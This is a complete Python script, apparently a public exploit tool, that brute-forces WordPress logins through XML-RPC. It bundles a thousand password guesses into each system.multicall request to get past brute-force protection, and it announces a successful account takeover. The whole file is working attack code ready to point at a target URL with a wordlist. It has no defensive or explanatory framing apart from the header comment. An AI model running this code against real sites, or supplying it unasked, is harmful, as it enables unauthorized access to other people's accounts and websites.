#!/usr/bin/python
# Wordpress XML-RPC Brute Force Amplification Exploit by 1N3
# Last Updated: 20170215
# https://crowdshield.com
#
# ABOUT: This exploit launches a brute force amplification attack on target 
# Wordpress sites. Since XMLRPC allows multiple auth calls per request, 
# amplification is possible and standard brute force protection will not block 
# the attack.
#
# USAGE: ./wp-xml-brute http://target.com/xmlrpc.php passwords.txt username [username2] [username3]...
#

import time, urllib, urllib2, sys, requests, ssl
from array import *

WAIT_TIME = 5
PASSWD_PER_REQUEST = 1000

class bcolors:
    HEADER    = '\033[95m'
    OKBLUE    = '\033[94m'
    OKGREEN   = '\033[92m'
    WARNING   = '\033[93m'
    FAIL      = '\033[91m'
    ENDC      = '\033[0m'
    BOLD      = '\033[1m'
    UNDERLINE = '\033[4m'

def banner(argv, usage = False, url = None, users = None):
    print bcolors.OKBLUE + " __      __                        .___                                             " + bcolors.ENDC
    print bcolors.OKBLUE + "/  \    /  \   ____   _______    __| _/ ______   _______    ____     ______   ______" + bcolors.ENDC
    print bcolors.OKBLUE + "\   \/\/   /  /  _ \  \_  __ \  / __ |  \____ \  \_  __ \ _/ __ \   /  ___/  /  ___/" + bcolors.ENDC
    print bcolors.OKBLUE + " \        /  (  <_> )  |  | \/ / /_/ |  |  |_> >  |  | \/ \  ___/   \___ \   \___ \ " + bcolors.ENDC
    print bcolors.OKBLUE + "  \__/\  /    \____/   |__|    \____ |  |   __/   |__|     \___  > /____  > /____  >" + bcolors.ENDC
    print bcolors.OKBLUE + "       \/                           \/  |__|                   \/       \/       \/ " + bcolors.ENDC
    print bcolors.OKBLUE + "" + bcolors.ENDC
    print bcolors.OKBLUE + "        \ /       _  _  __    _  _    ___ __    __ _  _  __ __" + bcolors.ENDC
    print bcolors.OKBLUE + "         X |V||  |_)|_)/     |_)|_)| | | |_    |_ / \|_)/  |_ " + bcolors.ENDC
    print bcolors.OKBLUE + '        / \| ||__| \|  \__   |_)| \|_| | |__   |  \_/| \\\__|__' + bcolors.ENDC
    print bcolors.OKBLUE + "" + bcolors.ENDC
    print ""
    print bcolors.OKBLUE + "+ -- --=[XML-RPC Brute Force Exploit by 1N3 @ https://crowdshield.com" + bcolors.ENDC
    if usage:
        print bcolors.OKBLUE + "+ -- --=[Usage: %s http://wordpress.org/xmlrpc.php passwords.txt username [username]..." % (argv[0]) + bcolors.ENDC
        sys.exit(0)
    else:
        print bcolors.WARNING + "+ -- --=[Brute forcing target: " + url + " with usernames: " + str(users) + "" + bcolors.ENDC

def send_request(url, data):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    header = 'headers={"Content-Type": "application/xml"}'
    req = urllib2.Request(url, data, headers={'Content-Type': 'application/xml'})
    rsp = urllib2.urlopen(req,context=ctx)
    return rsp.read()

def check_response(content, user, passwd):
    if "incorrect" in content.lower():
        print bcolors.FAIL + "+ -- --=[Wrong username or password: " + user + "/" + passwd + "" + bcolors.ENDC
    elif "admin" in content.lower():
        print bcolors.OKGREEN + "+ -- --=[w00t! User found! Wordpress is pwned! " + user + "/" + passwd + "" + bcolors.ENDC
        sys.exit(0)
    else:
        print bcolors.WARNING + "+ -- --=[Invalid response from target" + bcolors.ENDC
        sys.exit(0)

def template(entries):
    t  = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>'
    for entry in entries:
        t += "<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>%s</string></value><value><string>%s</string></value></data></array></value></data></array></value></member></struct></value>" % (entry.get('user'), entry.get('passwd'))
    t += '</data></array></value></param></params></methodCall>'
    return t

def attack(entries):
    if len(entries) < 1: return
    t = template(entries)
    return send_request(url, t)

def find_one(entries):
    for entry in entries:
        t = template([entry])
        content = send_request(url, t)
        check_response(content, entry.get('user'), entry.get('passwd'))

if __name__ == '__main__':
    if len(sys.argv) < 3: banner(sys.argv, True)

    url      = sys.argv[1]     # SET TARGET
    wordlist = sys.argv[2]     # SET CUSTOM WORDLIST
    users    = sys.argv[3:]    # SET USERNAME TO BRUTE FORCE

    banner(sys.argv, False, url, users) 

    with open(wordlist, 'r') as f:
        passwds = f.read().splitlines()

    entries = []
    for user in users:
        print "user: %s" % user
        for num in range(0, len(passwds)):
            if (len(entries) == PASSWD_PER_REQUEST):
                if "admin" in attack(entries):
                    find_one(entries)
                entries = []
                time.sleep(WAIT_TIME)
            entries.append({"user": user, "passwd": passwds[num]})
        if "admin" in attack(entries):
            find_one(entries)
        entries = []

